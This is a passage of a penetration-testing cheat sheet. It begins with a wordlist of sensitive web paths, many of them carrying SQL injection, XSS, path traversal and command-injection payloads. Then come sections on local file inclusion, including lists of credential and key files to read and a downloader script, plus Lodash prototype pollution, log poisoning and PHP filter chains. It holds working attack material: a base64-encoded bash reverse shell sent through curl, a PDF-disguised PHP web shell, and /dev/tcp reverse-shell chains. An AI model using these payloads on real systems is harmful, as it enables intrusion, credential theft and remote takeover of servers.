/redmine/config/secrets.yml
/redmine/config/settings.yml
/redoc
/reminder.sh
/remote/login
/Reports/Pages/Folder.aspx
/ReportServer
/ReportServer/Pages/ReportViewer.aspx
/requesthandler/
/requesthandlerext/
/rest/api/2/dashboard?maxResults=100
/rest/api/2/project?maxResults=100
/rest/api/latest/groupuserpicker?query=1&maxResults=50000&showAvatar=true
/rest/api/latest/serverInfo
/rest/beta/repositories/go/group
/rest/tinymce/1/macro/preview
/rgs/
/rgsclients/
/robomongo.json
/robots.txt%2e%2e%3B/
/robots.txt..%3B/
/robots.txt../admin/
/robots.txt..;/
/robots.txt/%2e%2e%3B/
/robots.txt/..%3B/
/robots.txt/../admin/
/robots.txt/..;/
/roundcube/logs/errors.log
/roundcube/logs/sendmail
/routes/error_log
/rpc/
/rpcwithcert/
/ruby/config/storage.yml
/run
/run.sh
/runningpods/
/s/sfsites/aura
/s3cmd.ini
/s3proxy.conf
/sap/bc/gui/sap/its/webgui
/sap/hana/xs/formLogin/login.html
/sap/wdisp/admin/public/default.html
/sapi/debug/default/view
/scheduler/
/schema
/schema.rb
/script
/search/members/?id`%3D520)%2f**%2funion%2f**%2fselect%2f**%2f1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2Cunhex%28%2770726f6a656374646973636f766572792e696f%27%29%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%2C30%2C31%2C32%23sqli=1
/search/token.json
/search?search_key={{1337*1338}}
/secret_token.rb
/secrets.yml
/secure/ConfigurePortalPages!default.jspa?view=popular
/secure/ContactAdministrators!default.jspa
/secure/Dashboard.jspa
/secure/ManageFilters.jspa?filter=popular&filterView=popular
/secure/ManageFilters.jspa?filterView=search&Search=Search&filterView=search&sortColumn=favcount&sortAscending=false
/secure/popups/UserPickerBrowser.jspa
/secure/QueryComponent!Default.jspa
/secure/ViewUserHover.jspa
/security.txt
/security.yml
/sell
/seminovos/application/configs/application.ini
/server
/server-status
/server.key
/server/storage/
/service-account-credentials.json
/service/rest/swagger.json
/service?Wsdl
/servicedesk/customer/user/login
/servicedesk/customer/user/signup
/services/Version
/servlet/Satellite?destpage=%22%3Ch1xxx%3Cscriptalert(1)%3C%2Fscript&pagename=OpenMarket%2FXcelerate%2FUIFramework%2FLoginError
/servlet/taskProc?taskId=shortURL&taskEnv=xml&taskContentType=xml&srcURL=https
/servlist.conf
/sessions/new
/settings.php.bak
/settings.php.dist
/settings.php.old
/settings.php.save
/settings.php.swp
/settings.php.txt
/settings.py
/settings.yml
/settings/settings.py
/setup.sh
/sfsites/aura
/sftp-config.json
/share/page/dologin
/shop/
/shop/application/configs/application.ini
/shutdown
/sidekiq
/site.sql
/site_cg/application/configs/application.ini
/sitecore/shell/sitecore.version.xml
/sitemanager.xml
/sites/all/libraries/mailchimp/vendor/phpunit/phpunit/phpunit
/slr/application/configs/application.ini
/smb.conf
/solr/
/sphinx
/sphinx-graphiql
/spring
/sql.sql
/ssl/localhost.key
/sslmgr
/startup.sh
/stat.jsp?cmd=chcp+437+%7c+dir
/static%2e%2e%3B/
/static..%3B/
/static../.git/config
/static../admin/
/static..;/
/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
/static/%2e%2e%3B/
/static/..%3B/
/static/..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd
/static/..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd
/static/..%5c..%5c..%5c..%5c..%5cetc/passwd
/static/..%5c..%5c..%5c..%5cetc/passwd
/static/..%5c..%5c..%5cetc/passwd
/static/..%5c..%5cetc/passwd
/static/..%5cetc/passwd
/static/../../../a/../../../../etc/passwd
/static/../admin/
/static/..;/
/static/api/swagger.json
/static/api/swagger.yaml
/static/emq.ico
/stats/summary
/status%3E%3Cscript%3Ealert(31337)%3C%2Fscript%3E
/status.php
/status/selfDiscovered/status
/storage.yml
/storage/
/storage/logs/laravel.log
/store/app/etc/local.xml
/subscriptions
/svnserve.conf
/swagger
/swagger-resources
/swagger-resources/restservices/v2/api-docs
/swagger-ui
/swagger-ui.html
/swagger-ui.js
/swagger-ui/swagger-ui.js
/swagger.json
/swagger.yaml
/swagger/api-docs
/swagger/index.html
/swagger/swagger
/swagger/swagger-ui.html
/swagger/swagger-ui.js
/swagger/ui/index
/swagger/ui/swagger-ui.js
/swagger/v1/api-docs
/swagger/v1/swagger.json
/swagger/v1/swagger.json/
/swagger/v1/swagger.yaml
/swagger/v2/api-docs
/swagger/v2/swagger.json
/swagger/v2/swagger.yaml
/sysmgmt/2015/bmc/info"  # Firmware Version and other info (iDRAC9
/system
/system-diagnostics
/systemstatus.xml
/Telerik.Web.UI.DialogHandler.aspx
/Telerik.Web.UI.DialogHandler.aspx?dp=1
/Telerik.Web.UI.DialogHandler.axd?dp=1
/Telerik.Web.UI.WebResource.axd?type=rau
/telescope/requests
/temp.php
/temp.sql
/test
/test.cgi
/test.php
/test/config/secrets.yml
/test/pathtraversal/master/..%252f..%252f..%252f..%252f../etc/passwd
/threaddump
/Thumbs.db
/tiki
/time.php
/tmui/login.jsp
/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license
/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/f5
/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'
/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin'
/tmui/tmui/login/welcome.jsp
/token.json
/tool/view/phpinfo.view.php
/tools/adminer.php
/toolsadminer.php
/trace
/Trace.axd
/translate.sql
/translations/en.json
/ucwa/
/ueditor/php/getRemoteImage.php
/ui/login.action
/ui/vault/auth
/unifiedmessaging/
/update.sh
/user
/user.ini
/user/0
/user/1
/user/2
/user/3
/user/login
/userportal/webpages/myaccount/login.jsp
/users.sql
/v0.1/
/v1
/v1.0/
/v1/
/v1/altair
/v1/api-docs
/v1/api/graphql
/v1/explorer
/v1/graph
/v1/graphiql
/v1/graphiql.css
/v1/graphiql.js
/v1/graphiql.min.css
/v1/graphiql.min.js
/v1/graphiql.php
/v1/graphiql/finland
/v1/graphql
/v1/graphql-explorer
/v1/graphql.php
/v1/graphql/console
/v1/graphql/schema.json
/v1/graphql/schema.xml
/v1/graphql/schema.yaml
/v1/playground
/v1/subscriptions
/v2
/v2/altair
/v2/api-docs
/v2/api/graphql
/v2/explorer
/v2/graph
/v2/graphiql
/v2/graphiql.css
/v2/graphiql.js
/v2/graphiql.min.css
/v2/graphiql.min.js
/v2/graphiql.php
/v2/graphiql/finland
/v2/graphql
/v2/graphql-explorer
/v2/graphql.php
/v2/graphql/console
/v2/graphql/schema.json
/v2/graphql/schema.xml
/v2/graphql/schema.yaml
/v2/keys/
/v2/playground
/v2/subscriptions
/v3
/v3/altair
/v3/api/graphql
/v3/explorer
/v3/graph
/v3/graphiql
/v3/graphiql.css
/v3/graphiql.js
/v3/graphiql.min.css
/v3/graphiql.min.js
/v3/graphiql.php
/v3/graphiql/finland
/v3/graphql
/v3/graphql-explorer
/v3/graphql.php
/v3/graphql/console
/v3/graphql/schema.json
/v3/graphql/schema.xml
/v3/graphql/schema.yaml
/v3/playground
/v3/subscriptions
/v4/altair
/v4/api/graphql
/v4/explorer
/v4/graph
/v4/graphiql
/v4/graphiql.css
/v4/graphiql.js
/v4/graphiql.min.css
/v4/graphiql.min.js
/v4/graphiql.php
/v4/graphiql/finland
/v4/graphql
/v4/graphql-explorer
/v4/graphql.php
/v4/graphql/console
/v4/graphql/schema.json
/v4/graphql/schema.xml
/v4/graphql/schema.yaml
/v4/playground
/v4/subscriptions
/Vagrantfile
/var/jwt/private.pem
/vendor/composer/installed.json
/vendor/phpunit/phpunit/phpunit
/vendor/webmozart/assert/.composer-auth.json
/verify.php?id=1&confirm_hash=
/version
/version.web
/views/ajax/autocomplete/user/a
/virtualems/Login.aspx
/VirtualEms/Login.aspx
/vpn/../vpns/cfg/smb.conf
/vpn/index.html
/wavemaker/studioService.download?method=getContent&inUrl=file///etc/passwd
/WEB-INF/web.xml
/web.config
/web/adminer.php
/web/debug/default/view
/web/home.html
/web/index.html
/web/manifest.json
/web/phpmyadmin/
/web/settings/settings.py
/web/static/c
/web_caps/webCapsConfig
/webadmin/out
/webadmin/start/
/webadmin/tools/systemstatus_remote.php
/webadmin/tools/unixlogin.php?login=admin&password=g%27%2C%27%27%29%3Bimport%20os%3Bos.system%28%276563686f2022626d39755a5868706333526c626e513d22207c20626173653634202d64203e202f7573722f6c6f63616c2f6e6574737765657065722f77656261646d696e2f6f7574%27.decode%28%27hex%27%29%29%23&timeout=5
/webadminer.php
/webalizer/
/webapi/v1/system/accountmanage/account
/webapp/?fccc0\><script>alert(1)</script>5f43d=1
/webclient/Login.xhtml
/webconsole/webpages/login.jsp
/webmail/
/webmail/?color=%22%3E%3Csvg/onload=alert(document.domain)%3E%22
/webmail/calendar/minimizer/index.php?style=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc%5cpasswd
/webmail/calendar/minimizer/index.php?style=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini
/webmin/
/webpack.config.js
/webpack.mix.js
/WebReport/ReportServer
/webstats/awstats.pl
/webticket/
/webticket/webticketservice.svc
/webticket/webticketservice.svcabs/
/wgetrc
/whoAmI/
/wiki
/wp
/ws2020/
/ws2021/
/ws_ftp.ini
/www.key
/www/delivery/afr.php?refresh=10000&\),10000000);alert(1337);setTimeout(alert(\
/xampp/phpmyadmin/
/xmldata?item=all
/xmldata?item=CpqKey
/XmlPeek.aspx?dt=\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\Windows\\\\win.ini&x=/validate.ashx?requri
/xmlpserver/servlet/adfresource?format=aaaaaaaaaaaaaaa&documentId=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini
/xmlrpc.php
/xprober.php
/yarn.lock
/yii/vendor/phpunit/phpunit/phpunit
/zabbix.php?action=dashboard.view&dashboardid=1
/zend/vendor/phpunit/phpunit/phpunit
/zenphoto/zp
/zipkin/
/zm/?view=log
/zp
/zp/zp
```

## Local File Inclusion (LFI)

```c
$ http://<RHOST>/<FILE>.php?file=
$ http://<RHOST>/<FILE>.php?file=../../../../../../../../etc/passwd
$ http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd
```

### Until PHP 5.3

```c
$ http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd%00
```

### Root Cause Function

```c
get_file_contents
```

### Null Byte

```c
%00
0x00
```

#### Example

```c
http://<RHOST>/index.php?lang=/etc/passwd%00
```

### Encoded Traversal Strings

```c
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
..././
...\.\
```

### php://filter Wrapper

> https://medium.com/@nyomanpradipta120/local-file-inclusion-vulnerability-cfd9e62d12cb

> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion

> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter

```c
url=php://filter/convert.base64-encode/resource=file:////var/www/<RHOST>/api.php
```

```c
$ http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=index
$ http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
$ base64 -d <FILE>.php
```

### Read Process via Burp Suite

```c
GET /index.php?page=../../../../../../../proc/425/cmdline HTTP/1.1
```

### Read Process Allocations via Burp Suite

```c
GET /index.php?page=../../../../../../../proc/425/maps HTTP/1.1
```

### Parameters

```c
cat
dir
img
action
board
date
detail
file
files
download
path
folder
prefix
include
page
------------------------------------------------------------------inc
locate
show
doc
site
type
view
content
document
layout
mod
conf
```

### Django, Rails, or Node.js Web Application Header Values

```c
Accept: ../../../../.././../../../../etc/passwd{{
Accept: ../../../../.././../../../../etc/passwd{%0D
Accept: ../../../../.././../../../../etc/passwd{%0A
Accept: ../../../../.././../../../../etc/passwd{%00
Accept: ../../../../.././../../../../etc/passwd{%0D{{
Accept: ../../../../.././../../../../etc/passwd{%0A{{
Accept: ../../../../.././../../../../etc/passwd{%00{{
```

### Linux Files

```c
/etc/passwd
/etc/shadow
/etc/aliases
/etc/anacrontab
/etc/apache2/apache2.conf
/etc/apache2/httpd.conf
/etc/apache2/sites-available/000-default.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/at.allow
/etc/at.deny
/etc/bashrc
/etc/bootptab
/etc/chrootUsers
/etc/chttp.conf
/etc/cron.allow
/etc/cron.deny
/etc/crontab
/etc/cups/cupsd.conf
/etc/exports
/etc/fstab
/etc/ftpaccess
/etc/ftpchroot
/etc/ftphosts
/etc/groups
/etc/grub.conf
/etc/hosts
/etc/hosts.allow
/etc/hosts.deny
/etc/httpd/access.conf
/etc/httpd/conf/httpd.conf
/etc/httpd/httpd.conf
/etc/httpd/logs/access_log
/etc/httpd/logs/access.log
/etc/httpd/logs/error_log
/etc/httpd/logs/error.log
/etc/httpd/php.ini
/etc/httpd/srm.conf
/etc/inetd.conf
/etc/inittab
/etc/issue
/etc/knockd.conf
/etc/lighttpd.conf
/etc/lilo.conf
/etc/logrotate.d/ftp
/etc/logrotate.d/proftpd
/etc/logrotate.d/vsftpd.log
/etc/lsb-release
/etc/motd
/etc/modules.conf
/etc/motd
/etc/mtab
/etc/my.cnf
/etc/my.conf
/etc/mysql/my.cnf
/etc/network/interfaces
/etc/networks
/etc/npasswd
/etc/passwd
/etc/php4.4/fcgi/php.ini
/etc/php4/apache2/php.ini
/etc/php4/apache/php.ini
/etc/php4/cgi/php.ini
/etc/php4/apache2/php.ini
/etc/php5/apache2/php.ini
/etc/php5/apache/php.ini
/etc/php/apache2/php.ini
/etc/php/apache/php.ini
/etc/php/cgi/php.ini
/etc/php.ini
/etc/php/php4/php.ini
/etc/php/php.ini
/etc/printcap
/etc/profile
/etc/proftp.conf
/etc/proftpd/proftpd.conf
/etc/pure-ftpd.conf
/etc/pureftpd.passwd
/etc/pureftpd.pdb
/etc/pure-ftpd/pure-ftpd.conf
/etc/pure-ftpd/pure-ftpd.pdb
/etc/pure-ftpd/putreftpd.pdb
/etc/redhat-release
/etc/resolv.conf
/etc/samba/smb.conf
/etc/snmpd.conf
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/etc/ssh/ssh_host_dsa_key
/etc/ssh/ssh_host_dsa_key.pub
/etc/ssh/ssh_host_key
/etc/ssh/ssh_host_key.pub
/etc/sysconfig/network
/etc/syslog.conf
/etc/termcap
/etc/vhcs2/proftpd/proftpd.conf
/etc/vsftpd.chroot_list
/etc/vsftpd.conf
/etc/vsftpd/vsftpd.conf
/etc/wu-ftpd/ftpaccess
/etc/wu-ftpd/ftphosts
/etc/wu-ftpd/ftpusers
/logs/pure-ftpd.log
/logs/security_debug_log
/logs/security_log
/opt/lampp/etc/httpd.conf
/opt/xampp/etc/php.ini
/proc/cmdline
/proc/cpuinfo
/proc/filesystems
/proc/interrupts
/proc/ioports
/proc/meminfo
/proc/modules
/proc/mounts
/proc/net/arp
/proc/net/tcp
/proc/net/udp
/proc/<PID>/cmdline
/proc/<PID>/maps
/proc/sched_debug
/proc/self/cwd/app.py
/proc/self/environ
/proc/self/net/arp
/proc/stat
/proc/swaps
/proc/version
/root/anaconda-ks.cfg
/usr/etc/pure-ftpd.conf
/usr/lib/php.ini
/usr/lib/php/php.ini
/usr/local/apache/conf/modsec.conf
/usr/local/apache/conf/php.ini
/usr/local/apache/log
/usr/local/apache/logs
/usr/local/apache/logs/access_log
/usr/local/apache/logs/access.log
/usr/local/apache/audit_log
/usr/local/apache/error_log
/usr/local/apache/error.log
/usr/local/cpanel/logs
/usr/local/cpanel/logs/access_log
/usr/local/cpanel/logs/error_log
/usr/local/cpanel/logs/license_log
/usr/local/cpanel/logs/login_log
/usr/local/cpanel/logs/stats_log
/usr/local/etc/httpd/logs/access_log
/usr/local/etc/httpd/logs/error_log
/usr/local/etc/php.ini
/usr/local/etc/pure-ftpd.conf
/usr/local/etc/pureftpd.pdb
/usr/local/lib/php.ini
/usr/local/php4/httpd.conf
/usr/local/php4/httpd.conf.php
/usr/local/php4/lib/php.ini
/usr/local/php5/httpd.conf
/usr/local/php5/httpd.conf.php
/usr/local/php5/lib/php.ini
/usr/local/php/httpd.conf
/usr/local/php/httpd.conf.ini
/usr/local/php/lib/php.ini
/usr/local/pureftpd/etc/pure-ftpd.conf
/usr/local/pureftpd/etc/pureftpd.pdn
/usr/local/pureftpd/sbin/pure-config.pl
/usr/local/www/logs/httpd_log
/usr/local/Zend/etc/php.ini
/usr/sbin/pure-config.pl
/var/adm/log/xferlog
/var/apache2/config.inc
/var/apache/logs/access_log
/var/apache/logs/error_log
/var/cpanel/cpanel.config
/var/lib/mysql/my.cnf
/var/lib/mysql/mysql/user.MYD
/var/local/www/conf/php.ini
/var/log/apache2/access_log
/var/log/apache2/access.log
/var/log/apache2/error_log
/var/log/apache2/error.log
/var/log/apache/access_log
/var/log/apache/access.log
/var/log/apache/error_log
/var/log/apache/error.log
/var/log/apache-ssl/access.log
/var/log/apache-ssl/error.log
/var/log/auth.log
/var/log/boot
/var/htmp
/var/log/chttp.log
/var/log/cups/error.log
/var/log/daemon.log
/var/log/debug
/var/log/dmesg
/var/log/dpkg.log
/var/log/exim_mainlog
/var/log/exim/mainlog
/var/log/exim_paniclog
/var/log/exim.paniclog
/var/log/exim_rejectlog
/var/log/exim/rejectlog
/var/log/faillog
/var/log/ftplog
/var/log/ftp-proxy
/var/log/ftp-proxy/ftp-proxy.log
/var/log/httpd-access.log
/var/log/httpd/access_log
/var/log/httpd/access.log
/var/log/httpd/error_log
/var/log/httpd/error.log
/var/log/httpsd/ssl.access_log
/var/log/httpsd/ssl_log
/var/log/kern.log
/var/log/lastlog
/var/log/lighttpd/access.log
/var/log/lighttpd/error.log
/var/log/lighttpd/lighttpd.access.log
/var/log/lighttpd/lighttpd.error.log
/var/log/mail.info
/var/log/mail.log
/var/log/maillog
/var/log/mail.warn
/var/log/message
/var/log/messages
/var/log/mysqlderror.log
/var/log/mysql.log
/var/log/mysql/mysql-bin.log
/var/log/mysql/mysql.log
/var/log/mysql/mysql-slow.log
/var/log/proftpd
/var/log/pureftpd.log
/var/log/pure-ftpd/pure-ftpd.log
/var/log/secure
/var/log/vsftpd.log
/var/log/wtmp
/var/log/xferlog
/var/log/yum.log
/var/mysql.log
/var/run/utmp
/var/spool/cron/crontabs/root
/var/webmin/miniserv.log
/var/www/html<VHOST>/__init__.py
/var/www/html/db_connect.php
/var/www/html/utils.php
/var/www/log/access_log
/var/www/log/error_log
/var/www/logs/access_log
/var/www/logs/error_log
/var/www/logs/access.log
/var/www/logs/error.log
~/.atfp_history
~/.bash_history
~/.bash_logout
~/.bash_profile
~/.bashrc
~/.gtkrc
~/.login
~/.logout
~/.mysql_history
~/.nano_history
~/.php_history
~/.profile
~/.ssh/authorized_keys
~/.ssh/id_dsa
~/.ssh/id_dsa.pub
~/.ssh/id_rsa
~/.ssh/id_rsa.pub
~/.ssh/identity
~/.ssh/identity.pub
~/.viminfo
~/.wm_style
~/.Xdefaults
~/.xinitrc
~/.Xresources
~/.xsession
```

### Windows Files

```c
C:/Users/Administrator/NTUser.dat
C:/Documents and Settings/Administrator/NTUser.dat
C:/apache/logs/access.log
C:/apache/logs/error.log
C:/apache/php/php.ini
C:/boot.ini
C:/inetpub/wwwroot/global.asa
C:/MySQL/data/hostname.err
C:/MySQL/data/mysql.err
C:/MySQL/data/mysql.log
C:/MySQL/my.cnf
C:/MySQL/my.ini
C:/php4/php.ini
C:/php5/php.ini
C:/php/php.ini
C:/Program Files/Apache Group/Apache2/conf/httpd.conf
C:/Program Files/Apache Group/Apache/conf/httpd.conf
C:/Program Files/Apache Group/Apache/logs/access.log
C:/Program Files/Apache Group/Apache/logs/error.log
C:/Program Files/FileZilla Server/FileZilla Server.xml
C:/Program Files/MySQL/data/hostname.err
C:/Program Files/MySQL/data/mysql-bin.log
C:/Program Files/MySQL/data/mysql.err
C:/Program Files/MySQL/data/mysql.log
C:/Program Files/MySQL/my.ini
C:/Program Files/MySQL/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log
C:/Program Files/MySQL/MySQL Server 5.0/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/my.ini
C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/access.log
C:/Program Files (x86)/Apache Group/Apache/conf/error.log
C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml
C:/Program Files (x86)/xampp/apache/conf/httpd.conf
C:/WINDOWS/php.ini
C:/WINDOWS/Repair/SAM
C:/Windows/repair/system
C:/Windows/repair/software
C:/Windows/repair/security
C:/WINDOWS/System32/drivers/etc/hosts
C:/Windows/win.ini
C:/WINNT/php.ini
C:/WINNT/win.ini
C:/xampp/apache/bin/php.ini
C:/xampp/apache/logs/access.log
C:/xampp/apache/logs/error.log
C:/Windows/Panther/Unattend/Unattended.xml
C:/Windows/Panther/Unattended.xml
C:/Windows/debug/NetSetup.log
C:/Windows/system32/config/AppEvent.Evt
C:/Windows/system32/config/SecEvent.Evt
C:/Windows/system32/config/default.sav
C:/Windows/system32/config/security.sav
C:/Windows/system32/config/software.sav
C:/Windows/system32/config/system.sav
C:/Windows/system32/config/regback/default
C:/Windows/system32/config/regback/sam
C:/Windows/system32/config/regback/security
C:/Windows/system32/config/regback/system
C:/Windows/system32/config/regback/software
C:/Program Files/MySQL/MySQL Server 5.1/my.ini
C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml
C:/Windows/System32/inetsrv/config/applicationHost.config
C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
```

### LFI File Downloader

#### lfidownloader.py

```c
import requests
from  pathlib import Path
import base64

# Files to Download:
# /proc/sched_debug
# /proc/<<PID>>/maps
# /usr/lib/x86_64-linux-gnu/libc-2.31.so
# /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6

base64_content    = "php://filter/convert.base64-encode/resource="
paint_text_content = "php://filter/read=string/resource="

remote  = "/proc/sched_debug"
result  = requests.get(f"http://<RHOST>/index.php?page={base64_content}{remote}").content

try:
  with open(f"temp/{Path(remote).name}", "wb") as file:
      file.write(base64.b64decode(result))
      file.close()
except:
  pass

print(f"Received : \n {remote} ")
```

## Lodash

> https://github.com/lodash/lodash

### Payload

```c
$ curl -X PUT -H 'Content-Type: application/json' http://127.0.0.1:<RPORT> --data '{"auth":{"name":"<USERNAME>","password":"<PASSWORD>"},"constructor":{"__proto__":{"canUpload":true,"canDelete":true}}}'
```

### Reverse Shell Payload

```c
$ curl --header "Content-Type: application/json" --request POST http://127.0.0.1:<RPORT>/upload --data '{"auth":{"name":"<USERNAME>","password":"<PASSWORD>"},"filename":"& echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMC85MDAzIDA+JjEK|base64 -d|bash"}'
```

## Log Poisoning

### SSH auth.log Poisoning

```c
$ ssh "<?php phpinfo();?>"@<LHOST>
$ http://<RHOST>/view.php?page=../../../../../var/log/auth.log
```

## Magic Bytes

### GIF

```c
GIF8;
GIF87a
```

### JPG

```c
\xff\xd8\xff
```

### PDF

```c
%PDF-1.5
%
```

```c
%PDF-1.7
%
```

### PNG

```c
\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[
```

### Examples

#### GIF Magic Bytes

```c
GIF89a;
<?php
  <PAYLOAD>
?>
```

## mitmproxy

```c
$ mitmproxy
```

## ngrok

> https://ngrok.com/

### Basic Commands

```c
$ ngrok tcp 9001
$ ngrok http 8080 --authtoken <AUTH_TOKEN>
$ ngrok http 8080 --basic-auth '<USERNAME>:<PASSWORD>'
$ ngrok http 8080 --oauth=google --oauth-allow-email=<EMAIL>
$ ngrok http http://localhost:8080
$ ngrok http http://localhost:8080 --authtoken <AUTH_TOKEN>
$ ngrok http http://localhost:8080 --basic-auth '<USERNAME>:<PASSWORD>'
$ ngrok http http://localhost:8080 --oauth=google --oauth-allow-email=<EMAIL>
```

### Example

```c
$ ngrok authtoken <AUTH_TOKEN>
$ ngrok tcp <LHOST>:<LPORT>
$ nc -v -nls 127.0.0.1 -p <LPORT>
$ nc 1.tcp.ngrok.io 10133
```

### Docker Example

```c
$ sudo docker run -it -p80 -e NGROK_AUTHTOKEN='<API_TOKEN>' ngrok/ngrok tcp 172.17.0.1:<LPORT>
$ nc -v -nls 172.17.0.1 -p <LPORT>
$ nc 1.tcp.ngrok.io 10133
```

## OpenSSL

```c
$ openssl s_client -connect <RHOST>:<RPORT> < /dev/null | openssl x509 -noout -text | grep -C3 -i dns
```

## PadBuster

> https://github.com/AonCyberLabs/PadBuster

```c
$ padbuster http://<RHOST> MbDbr%2Fl3cYxICLVXwfJk8Y4C94gp%2BnlB 8 -cookie auth=MbDbr%2Fl3cYxICLVXwfJk8Y4C94gp%2BnlB -plaintext user=admin
$ padbuster http://<RHOST>/profile.php <COOKIE_VALUE> 8 --cookie "<COOKIE_NAME>=<COOKIE_VALUE>;PHPSESSID=<PHPSESSID>"
$ padbuster http://<RHOST>/profile.php <COOKIE_VALUE> 8 --cookie "<COOKIE_NAME>=<COOKIE_VALUE>;PHPSESSID=<PHPSESSID>" -plaintext "{\"user\":\"<USERNAME>\",\"role\":\"admin\"}"
```

## PDF PHP Inclusion

### Create a File with a PDF Header, which contains PHP Code

```c
%PDF-1.4

<?php
    system($_GET["cmd"]);
?>
```

### Trigger

```c
$ http://<RHOST>/index.php?page=uploads/<FILE>.pdf%00&cmd=whoami
```

## PHP

### PHP Functions

```c
+----------------+-----------------+----------------+----------------+
|    Command     | Displays Output | Can Get Output | Gets Exit Code |
+----------------+-----------------+----------------+----------------+
| system()       | Yes (as text)   | Last line only | Yes            |
| passthru()     | Yes (raw)       | No             | Yes            |
| exec()         | No              | Yes (array)    | Yes            |
| shell_exec()   | No              | Yes (string)   | No             |
| backticks (``) | No              | Yes (string)   | No             |
+----------------+-----------------+----------------+----------------+
```

### phpinfo.phar

```c
<?php phpinfo(); ?>
```

### phpinfo Dump

```c
file_put_contents to put <?php phpinfo(); ?>
```

### Checking for Remote Code Execution (RCE)

> https://gist.github.com/jaquen/aab510eead65c9c95aa20a69d89c9d2a?s=09

```c
<?php

// A script to check what you can use for RCE on a target

$test_command = 'echo "time for some fun!"';
$functions_to_test = [
    'system',
    'shell_exec',
    'exec',
    'passthru',
    'popen',
    'proc_open',
];

function test_function($func_name, $test_command) {
    if (function_exists($func_name)) {
        try {
            $output = @$func_name($test_command);
            if ($output) {
                echo "Function '{$func_name}' enabled and executed the test command.\n";
            } else {
                echo "Function '{$func_name}' enabled, but failed to execute the test command.\n";
            }
        } catch (Throwable $e) {
            echo "Function '{$func_name}' enabled, but an error occurred: {$e->getMessage()}\n";
        }
    } else {
        echo "Function '{$func_name}' disabled or not available.\n";
    }
}

foreach ($functions_to_test as $func) {
    test_function($func, $test_command);
} ?>
```

### PHP Filter Chain Generator

> https://github.com/synacktiv/php_filter_chain_generator

```c
$ python3 php_filter_chain_generator.py --chain '<?= exec($_GET[0]); ?>'
$ python3 php_filter_chain_generator.py --chain "<?php echo shell_exec(id); ?>"
$ python3 php_filter_chain_generator.py --chain """<?php echo shell_exec(id); ?>"""
$ python3 php_filter_chain_generator.py --chain """"<?php exec(""/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"");?>""""
$ python3 php_filter_chain_generator.py --chain """"<?php exec(""/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"");?>""""
```

#### Payload Execution

```c
http://<RHOST>/?page=php://filter/convert.base64-decode/resource=PD9waHAgZWNobyBzaGVsbF9leGVjKGlkKTsgPz4
```

OR

```c
$ python3 php_filter_chain_generator.py --chain '<?= exec($_GET[0]); ?>'
[+] The following gadget chain will generate the following code : <?= exec($_GET[0]); ?> (base64 value: PD89IGV4ZWMoJF9HRVRbMF0pOyA/Pg)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|<--- SNIP --->|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=<COMMAND>
```

### PHP Deserialization (Web Server Poisoning)

#### Finding PHP Deserialization Vulnerability

```c
$ grep -R serialize
```

```c
/index.php:        base64_encode(serialize($page)),
/index.php:unserialize($cookie);
```

#### Skeleton Payload

```c
if (empty($_COOKIE['PHPSESSID']))
{
    $page = new PageModel;
    $page->file = '/www/index.html';

    setcookie(
        'PHPSESSID',
        base64_encode(serialize($page)),
        time()+60*60*24,
        '/'
    );
}
```

#### Decoding and Web Server Poisoning

```c
$ echo "Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9" | base64 -d
O:9:"PageModel":1:{s:4:"file";s:15:"/www/index.html";}
```

#### Encoding

```c
$ python
Python 2.7.18 (default, Apr 28 2021, 17:39:59) 
[GCC 10.2.1 20210110] on linux2
